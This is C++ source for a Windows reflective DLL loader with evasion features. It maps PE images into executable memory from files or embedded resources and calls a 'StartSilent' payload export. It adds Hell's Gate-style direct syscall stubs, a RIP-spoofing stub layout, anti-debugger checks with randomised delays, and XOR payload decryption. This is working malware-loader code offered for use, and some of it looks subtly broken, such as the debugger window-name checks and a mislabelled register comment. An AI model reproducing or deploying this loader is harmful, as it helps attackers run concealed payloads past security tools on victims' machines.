#include "ReflectiveLoader.h"
#include <psapi.h>
#include <shlwapi.h>
#include <algorithm>
#include <random>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shlwapi.lib")

// Static member initialization
HANDLE ReflectiveLoader::g_hHeap = NULL;
std::map<LPVOID, SIZE_T> ReflectiveLoader::g_loadedModules;

// Hells Gate structures for C++
typedef struct _SYSCALL_STUB {
    BYTE mov_eax[5];    // B8 XX XX XX XX
    BYTE mov_r8_rcx[3]; // 4C 8B D1
    BYTE syscall[2];    // 0F 05
    BYTE ret[1];        // C3
} SYSCALL_STUB, *PSYSCALL_STUB;

typedef struct _RIP_SPOOFED_STUB {
    BYTE mov_eax[5];        // B8 XX XX XX XX
    BYTE mov_r8_rcx[3];     // 4C 8B D1
    BYTE mov_rax_landing[10]; // 48 B8 XX XX XX XX XX XX XX XX
    BYTE jmp_rax[2];        // FF E0
} RIP_SPOOFED_STUB, *PRIP_SPOOFED_STUB;

//------------------------------------------------------------------------------
// Initialization
//------------------------------------------------------------------------------

BOOL ReflectiveLoader::Initialize()
{
    g_hHeap = GetProcessHeap();
    if (!g_hHeap) {
        g_hHeap = HeapCreate(0, 0, 0);
        if (!g_hHeap) return FALSE;
    }
    return TRUE;
}

VOID ReflectiveLoader::Cleanup()
{
    UnloadAll();
    if (g_hHeap && g_hHeap != GetProcessHeap()) {
        HeapDestroy(g_hHeap);
        g_hHeap = NULL;
    }
}

//------------------------------------------------------------------------------
// Anti-debug / Anti-sandbox
//------------------------------------------------------------------------------

BOOL ReflectiveLoader::IsDebugged()
{
    // Check PEB BeingDebugged flag
    PPEB peb = (PPEB)__readgsqword(0x60);
    if (peb && peb->BeingDebugged) return TRUE;
    
    // Check NtGlobalFlag
    if (peb && (peb->NtGlobalFlag & 0x70)) return TRUE;
    
    // Check for debugger processes
    DWORD processes[] = { 0x474F5250, 0x67756264, 0x2E797272 }; // ollydbg, x64dbg, ida64
    for (int i = 0; i < 3; i++) {
        if (FindWindowA(NULL, (LPCSTR)&processes[i])) return TRUE;
    }
    
    return FALSE;
}

VOID ReflectiveLoader::SleepRandom(DWORD dwMinMs, DWORD dwMaxMs)
{
    static std::random_device rd;
    static std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(dwMinMs, dwMaxMs);
    Sleep(dis(gen));
}

//------------------------------------------------------------------------------
// Hells Gate for C++
//------------------------------------------------------------------------------

ULONG_PTR ReflectiveLoader::ExtractSSN(LPCSTR lpFunctionName)
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;
    
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)hNtdll + pDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)hNtdll + 
        pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    
    DWORD* pAddressOfNames = (DWORD*)((LPBYTE)hNtdll + pExportDir->AddressOfNames);
    WORD* pAddressOfOrdinals = (WORD*)((LPBYTE)hNtdll + pExportDir->AddressOfNameOrdinals);
    DWORD* pAddressOfFunctions = (DWORD*)((LPBYTE)hNtdll + pExportDir->AddressOfFunctions);
    
    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        LPCSTR lpCurrentName = (LPCSTR)((LPBYTE)hNtdll + pAddressOfNames[i]);
        if (strcmp(lpCurrentName, lpFunctionName) == 0) {
            DWORD dwFunctionRVA = pAddressOfFunctions[pAddressOfOrdinals[i]];
            LPBYTE lpFunction = (LPBYTE)hNtdll + dwFunctionRVA;
            
            // Scan for SSN (mov eax, SSN)
            for (int j = 0; j < 32; j++) {
                if (lpFunction[j] == 0xB8) {
                    ULONG_PTR ssn = *(ULONG_PTR*)(lpFunction + j + 1) & 0xFFFFFFFF;
                    if (ssn > 0 && ssn < 0x1000) {
                        return ssn;
                    }
                }
            }
            break;
        }
    }
    return 0;
}

LPVOID ReflectiveLoader::CreateSyscallStub(ULONG_PTR ssn)
{
    SYSCALL_STUB stub;
    stub.mov_eax[0] = 0xB8;
    *(ULONG_PTR*)(stub.mov_eax + 1) = ssn;
    stub.mov_r8_rcx[0] = 0x4C;
    stub.mov_r8_rcx[1] = 0x8B;
    stub.mov_r8_rcx[2] = 0xD1;
    stub.syscall[0] = 0x0F;
    stub.syscall[1] = 0x05;
    stub.ret[0] = 0xC3;
    
    LPVOID lpStub = VirtualAlloc(NULL, sizeof(stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (lpStub) {
        memcpy(lpStub, &stub, sizeof(stub));
        
        DWORD dwOldProtect;
        VirtualProtect(lpStub, sizeof(stub), PAGE_EXECUTE_READ, &dwOldProtect);
        FlushInstructionCache(GetCurrentProcess(), lpStub, sizeof(stub));
    }
    return lpStub;
}

//------------------------------------------------------------------------------
// Memory Management
//------------------------------------------------------------------------------

LPVOID ReflectiveLoader::AllocateMemory(SIZE_T dwSize)
{
    return HeapAlloc(g_hHeap, HEAP_ZERO_MEMORY, dwSize);
}

VOID ReflectiveLoader::FreeMemory(LPVOID lpAddress)
{
    if (lpAddress) HeapFree(g_hHeap, 0, lpAddress);
}

//------------------------------------------------------------------------------
// PE Processing
//------------------------------------------------------------------------------

BOOL ReflectiveLoader::IsValidPE(LPVOID pImageBase)
{
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pImageBase;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pImageBase + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    
    return TRUE;
}

BOOL ReflectiveLoader::IsValidPEMemory(LPVOID pImageBase, SIZE_T dwImageSize)
{
    if (!IsValidPE(pImageBase)) return FALSE;
    
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pImageBase + ((PIMAGE_DOS_HEADER)pImageBase)->e_lfanew);
    return (dwImageSize >= pNtHeaders->OptionalHeader.SizeOfImage);
}

BOOL ReflectiveLoader::ProcessRelocations(LPVOID pImageBase, ULONG_PTR dwDelta)
{
    if (dwDelta == 0) return TRUE;
    
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pImageBase + ((PIMAGE_DOS_HEADER)pImageBase)->e_lfanew);
    DWORD dwRelocRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    if (!dwRelocRVA) return TRUE;
    
    PIMAGE_BASE_RELOCATION pRelocDir = (PIMAGE_BASE_RELOCATION)((LPBYTE)pImageBase + dwRelocRVA);
    
    while (pRelocDir->VirtualAddress && pRelocDir->SizeOfBlock) {
        LPBYTE pRelocBlock = (LPBYTE)pImageBase + pRelocDir->VirtualAddress;
        DWORD dwEntryCount = (pRelocDir->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        PIMAGE_RELOCATION_ENTRY pRelocEntry = (PIMAGE_RELOCATION_ENTRY)((LPBYTE)pRelocDir + sizeof(IMAGE_BASE_RELOCATION));
        
        for (DWORD i = 0; i < dwEntryCount; i++) {
            if (pRelocEntry->Type == IMAGE_REL_BASED_DIR64) {
                ULONG_PTR* pAddress = (ULONG_PTR*)(pRelocBlock + pRelocEntry->Offset);
                *pAddress += dwDelta;
            }
            pRelocEntry++;
        }
        pRelocDir = (PIMAGE_BASE_RELOCATION)((LPBYTE)pRelocDir + pRelocDir->SizeOfBlock);
    }
    return TRUE;
}

BOOL ReflectiveLoader::ResolveImports(LPVOID pImageBase)
{
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pImageBase + ((PIMAGE_DOS_HEADER)pImageBase)->e_lfanew);
    DWORD dwImportRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (!dwImportRVA) return TRUE;
    
    PIMAGE_IMPORT_DESCRIPTOR pImportDir = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)pImageBase + dwImportRVA);
    
    while (pImportDir->Name) {
        LPCSTR lpDllName = (LPCSTR)((LPBYTE)pImageBase + pImportDir->Name);
        HMODULE hModule = GetModuleHandleA(lpDllName);
        if (!hModule) hModule = LoadLibraryA(lpDllName);
        if (!hModule) return FALSE;
        
        PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((LPBYTE)pImageBase + pImportDir->OriginalFirstThunk);
        PIMAGE_THUNK_DATA pFunc = (PIMAGE_THUNK_DATA)((LPBYTE)pImageBase + pImportDir->FirstThunk);
        if (!pThunk) pThunk = pFunc;
        
        while (pThunk->u1.AddressOfData) {
            FARPROC pfnFunction = NULL;
            if (pThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                pfnFunction = GetProcAddress(hModule, (LPCSTR)(pThunk->u1.Ordinal & 0xFFFF));
            } else {
                PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)pImageBase + pThunk->u1.AddressOfData);
                pfnFunction = GetProcAddress(hModule, pImportByName->Name);
            }
            if (!pfnFunction) return FALSE;
            pFunc->u1.Function = (ULONG_PTR)pfnFunction;
            
            pThunk++;
            pFunc++;
        }
        pImportDir++;
    }
    return TRUE;
}

BOOL ReflectiveLoader::ProcessTlsCallbacks(LPVOID pImageBase, DWORD dwReason)
{
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pImageBase + ((PIMAGE_DOS_HEADER)pImageBase)->e_lfanew);
    DWORD dwTlsRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    if (!dwTlsRVA) return TRUE;
    
    PIMAGE_TLS_DIRECTORY pTlsDir = (PIMAGE_TLS_DIRECTORY)((LPBYTE)pImageBase + dwTlsRVA);
    PIMAGE_TLS_CALLBACK* pTlsCallback = (PIMAGE_TLS_CALLBACK*)pTlsDir->AddressOfCallBacks;
    
    while (pTlsCallback && *pTlsCallback) {
        (*pTlsCallback)(pImageBase, dwReason, NULL);
        pTlsCallback++;
    }
    return TRUE;
}

DWORD ReflectiveLoader::GetExportFunction(LPVOID pImageBase, LPCSTR lpProcName)
{
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pImageBase;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pImageBase + pDosHeader->e_lfanew);
    
    DWORD dwExportRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!dwExportRVA) return 0;
    
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)pImageBase + dwExportRVA);
    DWORD* pAddressOfFunctions = (DWORD*)((LPBYTE)pImageBase + pExportDir->AddressOfFunctions);
    DWORD* pAddressOfNames = (DWORD*)((LPBYTE)pImageBase + pExportDir->AddressOfNames);
    WORD* pAddressOfOrdinals = (WORD*)((LPBYTE)pImageBase + pExportDir->AddressOfNameOrdinals);
    
    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        LPCSTR lpCurrentName = (LPCSTR)((LPBYTE)pImageBase + pAddressOfNames[i]);
        if (strcmp(lpCurrentName, lpProcName) == 0) {
            return pAddressOfFunctions[pAddressOfOrdinals[i]];
        }
    }
    return 0;
}

//------------------------------------------------------------------------------
// Core Reflective Loading
//------------------------------------------------------------------------------

LPVOID ReflectiveLoader::LoadLibraryReflective(LPVOID pImageBase)
{
    if (!IsValidPE(pImageBase)) return NULL;
    
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pImageBase;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pImageBase + pDosHeader->e_lfanew);
    
    // Validate architecture (x64 only)
    if (pNtHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return NULL;
    
    SIZE_T dwSizeOfImage = pNtHeaders->OptionalHeader.SizeOfImage;
    LPVOID lpExecBase = VirtualAlloc(NULL, dwSizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!lpExecBase) return NULL;
    
    // Copy PE headers
    memcpy(lpExecBase, pImageBase, pNtHeaders->OptionalHeader.SizeOfHeaders);
    
    // Copy sections
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (pSectionHeader->SizeOfRawData) {
            memcpy((LPBYTE)lpExecBase + pSectionHeader->VirtualAddress,
                   (LPBYTE)pImageBase + pSectionHeader->PointerToRawData,
                   pSectionHeader->SizeOfRawData);
        }
        pSectionHeader++;
    }
    
    // Process relocations
    ULONG_PTR dwDelta = (ULONG_PTR)lpExecBase - pNtHeaders->OptionalHeader.ImageBase;
    if (!ProcessRelocations(lpExecBase, dwDelta)) {
        VirtualFree(lpExecBase, 0, MEM_RELEASE);
        return NULL;
    }
    
    // Resolve imports
    if (!ResolveImports(lpExecBase)) {
        VirtualFree(lpExecBase, 0, MEM_RELEASE);
        return NULL;
    }
    
    // Execute TLS callbacks
    ProcessTlsCallbacks(lpExecBase, DLL_PROCESS_ATTACH);
    
    // Call DLL entry point
    if (pNtHeaders->OptionalHeader.AddressOfEntryPoint) {
        fnDllMain lpEntryPoint = (fnDllMain)((LPBYTE)lpExecBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
        lpEntryPoint((HINSTANCE)lpExecBase, DLL_PROCESS_ATTACH, NULL);
    }
    
    // Store loaded module info
    g_loadedModules[lpExecBase] = dwSizeOfImage;
    
    return lpExecBase;
}

LPVOID ReflectiveLoader::LoadLibraryReflectiveMemory(LPVOID pImageBase, SIZE_T dwImageSize)
{
    if (!IsValidPEMemory(pImageBase, dwImageSize)) return NULL;
    return LoadLibraryReflective(pImageBase);
}

//------------------------------------------------------------------------------
// Public API
//------------------------------------------------------------------------------

LPVOID ReflectiveLoader::LoadFromMemory(LPVOID pImageBase, SIZE_T dwImageSize)
{
    if (!Initialize()) return NULL;
    
    // Check if we're being debugged
    if (IsDebugged()) {
        SleepRandom(5000, 15000);  // Anti-debug delay
    }
    
    // Optional: Apply heap encryption (simple XOR)
    // This would be implemented based on your needs
    
    return LoadLibraryReflectiveMemory(pImageBase, dwImageSize);
}

LPVOID ReflectiveLoader::LoadFromFile(LPCSTR lpFilePath)
{
    HANDLE hFile = CreateFileA(lpFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;
    
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    if (!dwFileSize) {
        CloseHandle(hFile);
        return NULL;
    }
    
    LPVOID pFileBuffer = AllocateMemory(dwFileSize);
    if (!pFileBuffer) {
        CloseHandle(hFile);
        return NULL;
    }
    
    DWORD dwBytesRead;
    ReadFile(hFile, pFileBuffer, dwFileSize, &dwBytesRead, NULL);
    CloseHandle(hFile);
    
    LPVOID pModule = LoadFromMemory(pFileBuffer, dwFileSize);
    FreeMemory(pFileBuffer);
    
    return pModule;
}

LPVOID ReflectiveLoader::LoadFromResource(HMODULE hModule, LPCSTR lpResourceName, LPCSTR lpResourceType)
{
    HRSRC hResource = FindResourceA(hModule, lpResourceName, lpResourceType);
    if (!hResource) return NULL;
    
    DWORD dwResourceSize = SizeofResource(hModule, hResource);
    if (!dwResourceSize) return NULL;
    
    HGLOBAL hGlobal = LoadResource(hModule, hResource);
    if (!hGlobal) return NULL;
    
    LPVOID pResourceData = LockResource(hGlobal);
    if (!pResourceData) return NULL;
    
    // Copy resource to our own buffer
    LPVOID pBuffer = AllocateMemory(dwResourceSize);
    if (!pBuffer) return NULL;
    
    memcpy(pBuffer, pResourceData, dwResourceSize);
    
    LPVOID pModule = LoadFromMemory(pBuffer, dwResourceSize);
    FreeMemory(pBuffer);
    
    return pModule;
}

int ReflectiveLoader::ExecutePayload(LPVOID pModule, LPCSTR lpFunctionName)
{
    if (!pModule) return -1;
    
    DWORD dwFunctionRVA = GetExportFunction(pModule, lpFunctionName);
    if (!dwFunctionRVA) return -2;
    
    fnPayloadStart pFunction = (fnPayloadStart)((LPBYTE)pModule + dwFunctionRVA);
    return pFunction();
}

int ReflectiveLoader::ExecutePayloadSilent(LPVOID pModule)
{
    return ExecutePayload(pModule, "StartSilent");
}

BOOL ReflectiveLoader::Unload(LPVOID pModule)
{
    auto it = g_loadedModules.find(pModule);
    if (it == g_loadedModules.end()) return FALSE;
    
    // Call DLL detach
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pModule;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pModule + pDosHeader->e_lfanew);
    
    if (pNtHeaders->OptionalHeader.AddressOfEntryPoint) {
        fnDllMain lpEntryPoint = (fnDllMain)((LPBYTE)pModule + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
        lpEntryPoint((HINSTANCE)pModule, DLL_PROCESS_DETACH, NULL);
    }
    
    ProcessTlsCallbacks(pModule, DLL_PROCESS_DETACH);
    VirtualFree(pModule, 0, MEM_RELEASE);
    g_loadedModules.erase(it);
    
    return TRUE;
}

BOOL ReflectiveLoader::UnloadAll()
{
    BOOL bSuccess = TRUE;
    for (auto it = g_loadedModules.begin(); it != g_loadedModules.end(); ) {
        if (!Unload(it->first)) bSuccess = FALSE;
        it = g_loadedModules.begin();
    }
    return bSuccess;
}

LPVOID ReflectiveLoader::GetModuleBase(LPVOID pModule)
{
    return pModule;
}

DWORD ReflectiveLoader::GetModuleSize(LPVOID pModule)
{
    auto it = g_loadedModules.find(pModule);
    if (it != g_loadedModules.end()) return (DWORD)it->second;
    return 0;
}

std::vector<BYTE> ReflectiveLoader::XorDecrypt(const std::vector<BYTE>& data, const std::vector<BYTE>& key)
{
    std::vector<BYTE> result(data.size());
    for (size_t i = 0; i < data.size(); i++) {
        result[i] = data[i] ^ key[i % key.size()];
    }
    return result;
}